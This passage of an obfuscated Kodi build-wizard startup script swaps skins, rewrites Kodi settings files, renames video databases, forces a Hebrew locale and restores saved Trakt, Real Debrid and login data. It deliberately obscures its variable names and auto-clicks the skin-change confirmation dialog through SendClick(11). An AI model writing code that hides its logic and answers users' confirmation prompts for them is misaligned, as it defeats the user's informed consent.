	O0O0O0OOOOOOOO000 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:585
	O0O0OO0OO000OOO00 =[];O00000000OO00000O =[]#line:586
	for O0OO0000OOO0OO0O0 in sorted (O0O0O0OOOOOOOO000 ,key =lambda O00OO000O0OOO0OO0 :O00OO000O0OOO0OO0 ):#line:587
		O0OO00O00000O0OO0 =os .path .split (O0OO0000OOO0OO0O0 [:-1 ])[1 ]#line:588
		OOOO00OOOO000000O =os .path .join (O0OO0000OOO0OO0O0 ,'addon.xml')#line:589
		if os .path .exists (OOOO00OOOO000000O ):#line:590
			OOOOOO0OO0OOO00O0 =open (OOOO00OOOO000000O )#line:591
			O0OO0000O00O0O00O =OOOOOO0OO0OOO00O0 .read ()#line:592
			OO000OO0OOOO00OOO =parseDOM2 (O0OO0000O00O0O00O ,'addon',ret ='id')#line:593
			OO0000OO0O0OO0000 =O0OO00O00000O0OO0 if len (OO000OO0OOOO00OOO )==0 else OO000OO0OOOO00OOO [0 ]#line:594
			try :#line:595
				OO000O0OO0OOOO0O0 =xbmcaddon .Addon (id =OO0000OO0O0OO0000 )#line:596
				O0O0OO0OO000OOO00 .append (OO000O0OO0OOOO0O0 .getAddonInfo ('name'))#line:597
				O00000000OO00000O .append (OO0000OO0O0OO0000 )#line:598
			except :#line:599
				pass #line:600
	OOO00O0000OOO0O00 =[];OOO0OO0OOOOOO000O =0 #line:601
	O0O000000000OO0OO =["Current Skin -- %s"%currSkin ()]+O0O0OO0OO000OOO00 #line:602
	OOO0OO0OOOOOO000O =DIALOG .select ("Select the Skin you want to swap with.",O0O000000000OO0OO )#line:603
	if OOO0OO0OOOOOO000O ==-1 :return #line:604
	else :#line:605
		OO0OO0000O0O0O000 =(OOO0OO0OOOOOO000O -1 )#line:606
		OOO00O0000OOO0O00 .append (OO0OO0000O0O0O000 )#line:607
		O0O000000000OO0OO [OOO0OO0OOOOOO000O ]="%s"%(O0O0OO0OO000OOO00 [OO0OO0000O0O0O000 ])#line:608
	if OOO00O0000OOO0O00 ==None :return #line:609
	for OOO0OO000OO000OOO in OOO00O0000OOO0O00 :#line:610
		swapSkins (O00000000OO00000O [OOO0OO000OO000OOO ])#line:611
def currSkin ():#line:613
	return xbmc .getSkinDir ('Container.PluginName')#line:614
def fix17update ():#line:616
	if KODIV >=17 and KODIV <18 :#line:617
		wiz .kodi17Fix ()#line:618
		xbmc .sleep (4000 )#line:619
		try :#line:620
			O00OOOO00OO000O0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:621
			OO000O0OO0OO0O0O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:622
			os .rename (O00OOOO00OO000O0O ,OO000O0OO0OO0O0O0 )#line:623
		except :#line:624
				pass #line:625
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:626
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:627
		fixfont ()#line:628
		O00000O0O00OOO00O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:629
		try :#line:631
			O00OO000O0O0O0OOO =open (O00000O0O00OOO00O ,'r')#line:632
			OO0OOOO0OOOOO0OOO =O00OO000O0O0O0OOO .read ()#line:633
			O00OO000O0O0O0OOO .close ()#line:634
			O0O00OO00OOO000OO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:635
			OO0OO000O0O0O0000 =re .compile (O0O00OO00OOO000OO ).findall (OO0OOOO0OOOOO0OOO )[0 ]#line:636
			O00OO000O0O0O0OOO =open (O00000O0O00OOO00O ,'w')#line:637
			O00OO000O0O0O0OOO .write (OO0OOOO0OOOOO0OOO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OO0OO000O0O0O0000 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:638
			O00OO000O0O0O0OOO .close ()#line:639
		except :#line:640
				pass #line:641
		wiz .kodi17Fix ()#line:642
		O00000O0O00OOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:643
		try :#line:644
			O00OO000O0O0O0OOO =open (O00000O0O00OOO00O ,'r')#line:645
			OO0OOOO0OOOOO0OOO =O00OO000O0O0O0OOO .read ()#line:646
			O00OO000O0O0O0OOO .close ()#line:647
			O0O00OO00OOO000OO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:648
			OO0OO000O0O0O0000 =re .compile (O0O00OO00OOO000OO ).findall (OO0OOOO0OOOOO0OOO )[0 ]#line:649
			O00OO000O0O0O0OOO =open (O00000O0O00OOO00O ,'w')#line:650
			O00OO000O0O0O0OOO .write (OO0OOOO0OOOOO0OOO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OO0OO000O0O0O0000 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:651
			O00OO000O0O0O0OOO .close ()#line:652
		except :#line:653
				pass #line:654
		swapSkins ('skin.Premium.mod')#line:655
	xbmcgui .Dialog ().ok ("Kodi Anonymous Fix",'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')#line:656
	os ._exit (1 )#line:657
def fix18update ():#line:658
	if KODIV >=18 :#line:659
		xbmc .sleep (4000 )#line:660
		if BUILDNAME =="":#line:661
			try :#line:662
				os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db"))#line:663
			except :#line:664
				pass #line:665
		try :#line:666
			O00OO00O00O0OO000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:667
			OOO00OO00OOO00O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:668
			os .rename (O00OO00O00O0OO000 ,OOO00OO00OOO00O00 )#line:669
		except :#line:670
				pass #line:671
		skindialogsettind18 ()#line:672
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:673
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:674
		fixfont ()#line:675
		OO0O000O0OO0OO0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:676
		try :#line:677
			O0OO00O0OO000OO0O =open (OO0O000O0OO0OO0OO ,'r')#line:678
			OO0O0OOO0O0OOO00O =O0OO00O0OO000OO0O .read ()#line:679
			O0OO00O0OO000OO0O .close ()#line:680
			OOOO0000OO0O00OO0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:681
			OOOO0O00OOOOOO0OO =re .compile (OOOO0000OO0O00OO0 ).findall (OO0O0OOO0O0OOO00O )[0 ]#line:682
			O0OO00O0OO000OO0O =open (OO0O000O0OO0OO0OO ,'w')#line:683
			O0OO00O0OO000OO0O .write (OO0O0OOO0O0OOO00O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOOO0O00OOOOOO0OO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:684
			O0OO00O0OO000OO0O .close ()#line:685
		except :#line:686
				pass #line:687
		wiz .kodi17Fix ()#line:688
		OO0O000O0OO0OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:689
		try :#line:690
			O0OO00O0OO000OO0O =open (OO0O000O0OO0OO0OO ,'r')#line:691
			OO0O0OOO0O0OOO00O =O0OO00O0OO000OO0O .read ()#line:692
			O0OO00O0OO000OO0O .close ()#line:693
			OOOO0000OO0O00OO0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:694
			OOOO0O00OOOOOO0OO =re .compile (OOOO0000OO0O00OO0 ).findall (OO0O0OOO0O0OOO00O )[0 ]#line:695
			O0OO00O0OO000OO0O =open (OO0O000O0OO0OO0OO ,'w')#line:696
			O0OO00O0OO000OO0O .write (OO0O0OOO0O0OOO00O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOOO0O00OOOOOO0OO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:697
			O0OO00O0OO000OO0O .close ()#line:698
		except :#line:699
				pass #line:700
		swapSkins ('skin.Premium.mod')#line:701
	xbmcgui .Dialog ().ok ("Kodi Anonymous Fix",'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')#line:702
	os ._exit (1 )#line:703
def swapSkins (O000OO0OOOOO0O0O0 ,title ="Error"):#line:704
	O0O00OOOO0OO0OO0O ='lookandfeel.skin'#line:705
	O0OOOOOO0O00O0O00 =O000OO0OOOOO0O0O0 #line:706
	O0O0O0000OOOO00O0 =getOld (O0O00OOOO0OO0OO0O )#line:707
	OOOO00OO00O0OO00O =O0O00OOOO0OO0OO0O #line:708
	setNew (OOOO00OO00O0OO00O ,O0OOOOOO0O00O0O00 )#line:709
	O0OOO0O0OOO0OOOOO =0 #line:710
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOO0O0OOO0OOOOO <100 :#line:711
		O0OOO0O0OOO0OOOOO +=1 #line:712
		xbmc .sleep (1 )#line:713
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:714
		xbmc .executebuiltin ('SendClick(11)')#line:715
	return True #line:716
def getOld (OO0O0O00OO000O0OO ):#line:718
	try :#line:719
		OO0O0O00OO000O0OO ='"%s"'%OO0O0O00OO000O0OO #line:720
		OOOOOOO00OOOOOOOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO0O0O00OO000O0OO )#line:721
		OO00OOOO0OO0O0O0O =xbmc .executeJSONRPC (OOOOOOO00OOOOOOOO )#line:723
		OO00OOOO0OO0O0O0O =simplejson .loads (OO00OOOO0OO0O0O0O )#line:724
		if OO00OOOO0OO0O0O0O .has_key ('result'):#line:725
			if OO00OOOO0OO0O0O0O ['result'].has_key ('value'):#line:726
				return OO00OOOO0OO0O0O0O ['result']['value']#line:727
	except :#line:728
		pass #line:729
	return None #line:730
def setNew (O00O00O0O0OOO0OO0 ,O000O0O00OOOO00OO ):#line:733
	try :#line:734
		O00O00O0O0OOO0OO0 ='"%s"'%O00O00O0O0OOO0OO0 #line:735
		O000O0O00OOOO00OO ='"%s"'%O000O0O00OOOO00OO #line:736
		O0000O000OO00OOOO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O00O00O0O0OOO0OO0 ,O000O0O00OOOO00OO )#line:737
		O00OO00000000O000 =xbmc .executeJSONRPC (O0000O000OO00OOOO )#line:739
	except :#line:740
		pass #line:741
	return None #line:742
def idle ():#line:743
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:744
def fixfont ():#line:745
	O00O00OOO00O0O0O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:746
	O0O00OO0OOOOOO0OO =json .loads (O00O00OOO00O0O0O0 );#line:748
	OO0OOO00O0O000OOO =O0O00OO0OOOOOO0OO ["result"]["settings"]#line:749
	OOO0OOOO000000O0O =[OOOOOO0OOO000OO0O for OOOOOO0OOO000OO0O in OO0OOO00O0O000OOO if OOOOOO0OOO000OO0O ["id"]=="audiooutput.audiodevice"][0 ]#line:751
	O0O0O0000O0O0OO00 =OOO0OOOO000000O0O ["options"];#line:752
	OO0O000OOO00OOOO0 =OOO0OOOO000000O0O ["value"];#line:753
	OO00O000O0O0O0OO0 =[OO00O0OOO0O000O00 for (OO00O0OOO0O000O00 ,O0OOO0O0O0OO0OO0O )in enumerate (O0O0O0000O0O0OO00 )if O0OOO0O0O0OO0OO0O ["value"]==OO0O000OOO00OOOO0 ][0 ];#line:755
	OO0OO00000OOOOO0O =(OO00O000O0O0O0OO0 +1 )%len (O0O0O0000O0O0OO00 )#line:757
	OOO0O000OO00OO0OO =O0O0O0000O0O0OO00 [OO0OO00000OOOOO0O ]["value"]#line:759
	OO00000OOOO000OOO =O0O0O0000O0O0OO00 [OO0OO00000OOOOO0O ]["label"]#line:760
	O0O0O0OO0OOO0000O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:762
	try :#line:764
		O0O0000O00000OOO0 =json .loads (O0O0O0OO0OOO0000O );#line:765
		if O0O0000O00000OOO0 ["result"]!=True :#line:767
			raise Exception #line:768
	except :#line:769
		sys .stderr .write ("Error switching audio output device")#line:770
		raise Exception #line:771
def checkSkin ():#line:774
	wiz .log ("[Build Check] Invalid Skin Check Start")#line:775
	O0OO00O0O0O0OO000 =wiz .getS ('defaultskin')#line:776
	O0O000OOOOOOO000O =wiz .getS ('defaultskinname')#line:777
	OOO000O0O00O0O0OO =wiz .getS ('defaultskinignore')#line:778
	OOO0O00OO0OO00OO0 =False #line:779
	if not O0OO00O0O0O0OO000 =='':#line:780
		if os .path .exists (os .path .join (ADDONS ,O0OO00O0O0O0OO000 )):#line:781
			if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,SKIN [5 :].title ()),"Would you like to set the skin back to:[/COLOR]",'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O000OOOOOOO000O )):#line:782
				OOO0O00OO0OO00OO0 =O0OO00O0O0O0OO000 #line:783
				OO000O00O0000OO00 =O0O000OOOOOOO000O #line:784
			else :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true');OOO0O00OO0OO00OO0 =False #line:785
		else :wiz .setS ('defaultskin','');wiz .setS ('defaultskinname','');O0OO00O0O0O0OO000 ='';O0O000OOOOOOO000O =''#line:786
	if O0OO00O0O0O0OO000 =='':#line:787
		O0OO0000O000O0O00 =[]#line:788
		OO00OO000000O0O00 =[]#line:789
		for O00OOO0OOOO00OOO0 in glob .glob (os .path .join (ADDONS ,'skin.*/')):#line:790
			O0OOO0000O0O0OOO0 ="%s/addon.xml"%O00OOO0OOOO00OOO0 #line:791
			if os .path .exists (O0OOO0000O0O0OOO0 ):#line:792
				OO0OO0O00OOO00OO0 =open (O0OOO0000O0O0OOO0 ,mode ='r');OO00OO0000O0OO0O0 =OO0OO0O00OOO00OO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','');OO0OO0O00OOO00OO0 .close ();#line:793
				O0OO00O00OO000O00 =wiz .parseDOM (OO00OO0000O0OO0O0 ,'addon',ret ='id')#line:794
				O0OOO000000OO0O0O =wiz .parseDOM (OO00OO0000O0OO0O0 ,'addon',ret ='name')#line:795
				wiz .log ("%s: %s"%(O00OOO0OOOO00OOO0 ,str (O0OO00O00OO000O00 [0 ])),xbmc .LOGNOTICE )#line:796
				if len (O0OO00O00OO000O00 )>0 :OO00OO000000O0O00 .append (str (O0OO00O00OO000O00 [0 ]));O0OO0000O000O0O00 .append (str (O0OOO000000OO0O0O [0 ]))#line:797
				else :wiz .log ("ID not found for %s"%O00OOO0OOOO00OOO0 ,xbmc .LOGNOTICE )#line:798
			else :wiz .log ("ID not found for %s"%O00OOO0OOOO00OOO0 ,xbmc .LOGNOTICE )#line:799
		if len (OO00OO000000O0O00 )>0 :#line:800
			if len (OO00OO000000O0O00 )>1 :#line:801
				if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,SKIN [5 :].title ()),"Would you like to view a list of avaliable skins?[/COLOR]"):#line:802
					OO0O0OOOO0O00OOO0 =DIALOG .select ("Select skin to switch to!",O0OO0000O000O0O00 )#line:803
					if OO0O0OOOO0O00OOO0 ==-1 :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true')#line:804
					else :#line:805
						OOO0O00OO0OO00OO0 =OO00OO000000O0O00 [OO0O0OOOO0O00OOO0 ]#line:806
						OO000O00O0000OO00 =O0OO0000O000O0O00 [OO0O0OOOO0O00OOO0 ]#line:807
				else :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true')#line:808
	if OOO0O00OO0OO00OO0 :#line:815
		skinSwitch .swapSkins (OOO0O00OO0OO00OO0 )#line:816
		O00OOOO0O0O0OOO0O =0 #line:817
		xbmc .sleep (1000 )#line:818
		while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OOOO0O0O0OOO0O <150 :#line:819
			O00OOOO0O0O0OOO0O +=1 #line:820
			xbmc .sleep (200 )#line:821
		if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:823
			wiz .ebi ('SendClick(11)')#line:824
			wiz .lookandFeelData ('restore')#line:825
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Skin Swap Timed Out![/COLOR]'%COLOR2 )#line:826
	wiz .log ("[Build Check] Invalid Skin Check End",xbmc .LOGNOTICE )#line:827
while xbmc .Player ().isPlayingVideo ():#line:829
	xbmc .sleep (1000 )#line:830
if KODIV >=17 :#line:832
	NOW =datetime .now ()#line:833
	temp =wiz .getS ('kodi17iscrap')#line:834
	if not temp =='':#line:835
		if temp >str (NOW -timedelta (minutes =2 )):#line:836
			wiz .log ("Killing Start Up Script")#line:837
			sys .exit ()#line:838
	wiz .log ("%s"%(NOW ))#line:839
	wiz .setS ('kodi17iscrap',str (NOW ))#line:840
	xbmc .sleep (1000 )#line:841
	if not wiz .getS ('kodi17iscrap')==str (NOW ):#line:842
		wiz .log ("Killing Start Up Script")#line:843
		sys .exit ()#line:844
	else :#line:845
		wiz .log ("Continuing Start Up Script")#line:846
wiz .log ("[Path Check] Started",xbmc .LOGNOTICE )#line:848
path =os .path .split (ADDONPATH )#line:849
if not ADDONID ==path [1 ]:DIALOG .ok (ADDONTITLE ,'[COLOR %s]Please make sure that the plugin folder is the same as the ADDON_ID.[/COLOR]'%COLOR2 ,'[COLOR %s]Plugin ID:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,ADDONID ),'[COLOR %s]Plugin Folder:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,path ));wiz .log ("[Path Check] ADDON_ID and plugin folder doesnt match. %s / %s "%(ADDONID ,path ))#line:850
else :wiz .log ("[Path Check] Good!",xbmc .LOGNOTICE )#line:851
if KODIADDONS in ADDONPATH :#line:854
	wiz .log ("Copying path to addons dir",xbmc .LOGNOTICE )#line:855
	if not os .path .exists (ADDONS ):os .makedirs (ADDONS )#line:856
	newpath =xbmc .translatePath (os .path .join ('special://home/addons/',ADDONID ))#line:857
	if os .path .exists (newpath ):#line:858
		wiz .log ("Folder already exists, cleaning House",xbmc .LOGNOTICE )#line:859
		wiz .cleanHouse (newpath )#line:860
		wiz .removeFolder (newpath )#line:861
	try :#line:862
		wiz .copytree (ADDONPATH ,newpath )#line:863
	except Exception as e :#line:864
		pass #line:865
	wiz .forceUpdate (True )#line:866
try :#line:868
	mybuilds =xbmc .translatePath (MYBUILDS )#line:869
	if not os .path .exists (mybuilds ):xbmcvfs .mkdirs (mybuilds )#line:870
except :#line:871
	pass #line:872
wiz .log ("[Installed Check] Started",xbmc .LOGNOTICE )#line:874
if KODIV >=17 and SKIN in ['skin.confluence','skin.estuary','skin.estouchy']and not BUILDNAME =="":#line:878
			wiz .kodi17Fix ()#line:879
			fix18update ()#line:880
			fix17update ()#line:881
if INSTALLED =='true':#line:884
    input =(ADDON .getSetting ("rdbuild"))#line:885
    if KEEPTRAKT =='true':traktit .traktIt ('restore','all');wiz .log ('[Installed Check] Restoring Trakt Data',xbmc .LOGNOTICE )#line:887
    if KEEPREAL =='true':debridit .debridIt ('restore','all');wiz .log ('[Installed Check] Restoring Real Debrid Data',xbmc .LOGNOTICE )#line:888
    if input =='true':loginit .loginIt ('restore','all');wiz .log ('[Installed Check] Restoring Login Data',xbmc .LOGNOTICE )#line:889
    wiz .clearS ('install')#line:890
wiz .log ("[Notifications] Started",xbmc .LOGNOTICE )#line:975
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:977
	input =(ADDON .getSetting ("autoupdate"))#line:978
	STARTP2 ()#line:979
	if not NOTIFY =='true':#line:980
		url =wiz .workingURL (NOTIFICATION )#line:981
		if url ==True :#line:982
			id ,msg =wiz .splitNotify (NOTIFICATION )#line:983
			if not id ==False :#line:984
				try :#line:985
					id =int (id );NOTEID =int (NOTEID )#line:986
					if id ==NOTEID :#line:987
						if NOTEDISMISS =='false':#line:988
							debridit .debridIt ('update','all')#line:989
							traktit .traktIt ('update','all')#line:990
							checkidupdate ()#line:991
						else :wiz .log ("[Notifications] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:992
					elif id >NOTEID :#line:993
						wiz .log ("[Notifications] id: %s"%str (id ),xbmc .LOGNOTICE )#line:994
						wiz .setS ('noteid',str (id ))#line:995
						wiz .setS ('notedismiss','false')#line:996
						if input =='true':#line:997
							debridit .debridIt ('update','all')#line:998
							traktit .traktIt ('update','all')#line:999
							checkidupdate ()#line:1000
						else :notify .notification (msg =msg )#line:1001
						wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:1002
				except Exception as e :#line:1003
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:1004
			else :wiz .log ("[Notifications] Text File not formated Correctly")#line:1005
		else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,url ),xbmc .LOGNOTICE )#line:1006
	else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:1007
else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:1008
wiz .log ("[Notifications2] Started",xbmc .LOGNOTICE )#line:1010
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium 18":#line:1011
	if not NOTIFY2 =='true':#line:1012
		url =wiz .workingURL (NOTIFICATION2 )#line:1013
		if url ==True :#line:1014
			id ,msg =wiz .splitNotify (NOTIFICATION2 )#line:1015
			if not id ==False :#line:1016
				try :#line:1017
					id =int (id );NOTEID2 =int (NOTEID2 )#line:1018
					if id ==NOTEID2 :#line:1019
						if NOTEDISMISS2 =='false':#line:1020
							notify .notification2 (msg )#line:1021
						else :wiz .log ("[Notifications2] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:1022
					elif id >NOTEID2 :#line:1023
						wiz .log ("[Notifications2] id: %s"%str (id ),xbmc .LOGNOTICE )#line:1024
						wiz .setS ('noteid2',str (id ))#line:1025
						wiz .setS ('notedismiss2','false')#line:1026
						notify .notification2 (msg =msg )#line:1027
						wiz .log ("[Notifications2] Complete",xbmc .LOGNOTICE )#line:1028
				except Exception as e :#line:1029
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:1030
			else :wiz .log ("[Notifications2] Text File not formated Correctly")#line:1031
		else :wiz .log ("[Notifications2] URL(%s): %s"%(NOTIFICATION2 ,url ),xbmc .LOGNOTICE )#line:1032
	else :wiz .log ("[Notifications2] Turned Off",xbmc .LOGNOTICE )#line:1033
else :wiz .log ("[Notifications2] Not Enabled",xbmc .LOGNOTICE )#line:1034
wiz .log ("[Notifications3] Started",xbmc .LOGNOTICE )#line:1036
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium 18"or BUILDNAME ==" Kodi Premium":#line:1037
	if not NOTIFY3 =='true':#line:1038
		url =wiz .workingURL (NOTIFICATION3 )#line:1039
		if url ==True :#line:1040
			id ,msg =wiz .splitNotify (NOTIFICATION3 )#line:1041
			if not id ==False :#line:1042
				try :#line:1043
					id =int (id );NOTEID3 =int (NOTEID3 )#line:1044
					if id ==NOTEID3 :#line:1045
						if NOTEDISMISS3 =='false':#line:1046
							notify .notification3 (msg )#line:1047
						else :wiz .log ("[Notifications3] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:1048
					elif id >NOTEID3 :#line:1049
						wiz .log ("[Notifications3] id: %s"%str (id ),xbmc .LOGNOTICE )#line:1050
						wiz .setS ('noteid3',str (id ))#line:1051
						wiz .setS ('notedismiss3','false')#line:1052
						notify .notification3 (msg =msg )#line:1053
						wiz .log ("[Notifications3] Complete",xbmc .LOGNOTICE )#line:1054
				except Exception as e :#line:1055
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:1056
			else :wiz .log ("[Notifications3] Text File not formated Correctly")#line:1057
		else :wiz .log ("[Notifications3] URL(%s): %s"%(NOTIFICATION3 ,url ),xbmc .LOGNOTICE )#line:1058
	else :wiz .log ("[Notifications3] Turned Off",xbmc .LOGNOTICE )#line:1059
else :wiz .log ("[Notifications3] Not Enabled",xbmc .LOGNOTICE )#line:1060
wiz .log ("[Trakt Data] Started",xbmc .LOGNOTICE )#line:1061
if KEEPTRAKT =='true':#line:1062
	if TRAKTSAVE <=str (TODAY ):#line:1063
		wiz .log ("[Trakt Data] Saving all Data",xbmc .LOGNOTICE )#line:1064
		traktit .autoUpdate ('all')#line:1065
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:1066
	else :#line:1067
		wiz .log ("[Trakt Data] Next Auto Save isnt until: %s / TODAY is: %s"%(TRAKTSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1068
else :wiz .log ("[Trakt Data] Not Enabled",xbmc .LOGNOTICE )#line:1069
wiz .log ("[Real Debrid Data] Started",xbmc .LOGNOTICE )#line:1071
if KEEPREAL =='true':#line:1072
	if REALSAVE <=str (TODAY ):#line:1073
		wiz .log ("[Real Debrid Data] Saving all Data",xbmc .LOGNOTICE )#line:1074
		debridit .autoUpdate ('all')#line:1075
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:1076
	else :#line:1077
		wiz .log ("[Real Debrid Data] Next Auto Save isnt until: %s / TODAY is: %s"%(REALSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1078
else :wiz .log ("[Real Debrid Data] Not Enabled",xbmc .LOGNOTICE )#line:1079
wiz .log ("[Login Data] Started",xbmc .LOGNOTICE )#line:1081
if KEEPLOGIN =='true':#line:1082
	if LOGINSAVE <=str (TODAY ):#line:1083
		wiz .log ("[Login Data] Saving all Data",xbmc .LOGNOTICE )#line:1084
		loginit .autoUpdate ('all')#line:1085
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:1086
	else :#line:1087
		wiz .log ("[Login Data] Next Auto Save isnt until: %s / TODAY is: %s"%(LOGINSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1088
else :wiz .log ("[Login Data] Not Enabled",xbmc .LOGNOTICE )#line:1089
wiz .log ("[Auto Clean Up] Started",xbmc .LOGNOTICE )#line:1091
if AUTOCLEANUP =='true':#line:1092
	service =False #line:1093
	days =[TODAY ,TOMORROW ,THREEDAYS ,ONEWEEK ]#line:1094
	feq =int (float (AUTOFEQ ))#line:1095
	if AUTONEXTRUN <=str (TODAY )or feq ==0 :#line:1096
		service =True #line:1097
		next_run =days [feq ]#line:1098
		wiz .setS ('nextautocleanup',str (next_run ))#line:1099
	else :wiz .log ("[Auto Clean Up] Next Clean Up %s"%AUTONEXTRUN ,xbmc .LOGNOTICE )#line:1100
	if service ==True :#line:1101
		AUTOCACHE =wiz .getS ('clearcache')#line:1102
		AUTOPACKAGES =wiz .getS ('clearpackages')#line:1103
		AUTOTHUMBS =wiz .getS ('clearthumbs')#line:1104
		if AUTOCACHE =='true':wiz .log ('[Auto Clean Up] Cache: On',xbmc .LOGNOTICE );wiz .clearCache (True )#line:1105
		else :wiz .log ('[Auto Clean Up] Cache: Off',xbmc .LOGNOTICE )#line:1106
		if AUTOTHUMBS =='true':wiz .log ('[Auto Clean Up] Old Thumbs: On',xbmc .LOGNOTICE );wiz .oldThumbs ()#line:1107
		else :wiz .log ('[Auto Clean Up] Old Thumbs: Off',xbmc .LOGNOTICE )#line:1108
		if AUTOPACKAGES =='true':wiz .log ('[Auto Clean Up] Packages: On',xbmc .LOGNOTICE );wiz .clearPackagesStartup ()#line:1109
		else :wiz .log ('[Auto Clean Up] Packages: Off',xbmc .LOGNOTICE )#line:1110
else :wiz .log ('[Auto Clean Up] Turned off',xbmc .LOGNOTICE )#line:1111
wiz .setS ('kodi17iscrap','')#line:1113
for dirpath ,dirnames ,filenames in os .walk (packagesdir ):#line:1182
	count =0 #line:1183
	for f in filenames :#line:1184
		count +=1 #line:1185
		fp =os .path .join (dirpath ,f )#line:1186
		total_size +=os .path .getsize (fp )#line:1187
total_sizetext ="%.0f"%(total_size /1024000.0 )#line:1188
for dirpath2 ,dirnames2 ,filenames2 in os .walk (thumbnails ):#line:1195
	for f2 in filenames2 :#line:1196
		fp2 =os .path .join (dirpath2 ,f2 )#line:1197
		total_size2 +=os .path .getsize (fp2 )#line:1198
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:1199
if int (total_sizetext2 )>filesize_thumb :#line:1201
	choice2 =xbmcgui .Dialog ().yesno ("[COLOR=red]קודי אנונימוס - ניקוי תמונות פוסטרים ישנות[/COLOR]",'[COLOR red]'+str (total_sizetext2 )+' MB  :גודל התיקיה היא [/COLOR]','מומלץ למחוק את התיקיה בשביל לפנות מקום נוסף במכשיר','האם ברצונך למחוק אותה עכשיו?',yeslabel ='כן',nolabel ='לא')#line:1202
	if choice2 ==1 :#line:1203
		maintenance .deleteThumbnails ()#line:1204
